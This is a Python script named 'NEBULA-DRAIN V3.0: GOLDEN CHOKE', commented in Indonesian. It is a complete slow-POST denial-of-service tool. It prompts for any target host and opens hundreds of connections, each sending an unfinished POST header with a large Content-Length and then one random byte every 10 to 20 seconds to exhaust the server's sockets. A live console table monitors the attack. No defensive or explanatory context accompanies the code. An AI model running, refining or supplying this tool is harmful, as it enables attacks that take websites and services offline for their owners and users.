import asyncio
import random
import time
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.table import Table

console = Console()

class GoldenChoke:
    def __init__(self, target, port=80, conns=100):
        self.target = target
        self.port = port
        self.conns = conns
        self.active_conns = 0
        self.total_sent = 0 # Dalam bytes (biar tau iritnya)

    async def choke(self):
        while True:
            try:
                # Buka koneksi tanpa SSL dulu buat test (L4-L7 Hybrid)
                reader, writer = await asyncio.open_connection(self.target, self.port)
                self.active_conns += 1
                
                # Kirim Header POST ke Form (Gantung!)
                # Kita gak kirim penutup header di sini
                header = (
                    f"POST / HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.randint(100,999)}\r\n"
                    f"Content-Length: {random.randint(5000, 10000)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"X-Azuya: {random.random()}\r\n"
                )
                writer.write(header.encode())
                await writer.drain()

                # Loop "Drip": Kirim 1 byte per 15 detik biar server GAK DC
                for i in range(100):
                    await asyncio.sleep(random.uniform(10, 20))
                    byte_data = random.choice("abcdefghijklmnopqrstuvwxyz").encode()
                    writer.write(byte_data)
                    await writer.drain()
                    self.total_sent += 1

            except Exception:
                pass
            finally:
                self.active_conns = max(0, self.active_conns - 1)
                await asyncio.sleep(1)

async def main():
    console.print(Panel("[bold yellow]NEBULA-DRAIN V3.0: GOLDEN CHOKE[/bold yellow]\n[cyan]Method: Low-Rate Socket Exhaustion[/cyan]", expand=False))
    
    target = console.input("[?] Target Host (ex: target.com): ")
    conns = int(console.input("[?] Max Choke Sockets (Def: 200): ") or 200)
    
    drainer = GoldenChoke(target, conns=conns)
    
    # Jalankan serangan
    for _ in range(conns):
        asyncio.create_task(drainer.choke())

    with Live(console=console, refresh_per_second=2) as live:
        while True:
            table = Table(title="Golden Choke Monitor", border_style="yellow")
            table.add_column("Property", style="cyan")
            table.add_column("Value", style="white")
            table.add_row("Target", drainer.target)
            table.add_row("Active Sockets", f"[bold green]{drainer.active_conns}[/bold green]")
            table.add_row("Bandwidth Used", f"{drainer.total_sent} bytes")
            table.add_row("Strategy", "[bold gold3]Slow and Persistent[/bold gold3]")
            
            live.update(table)
            await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
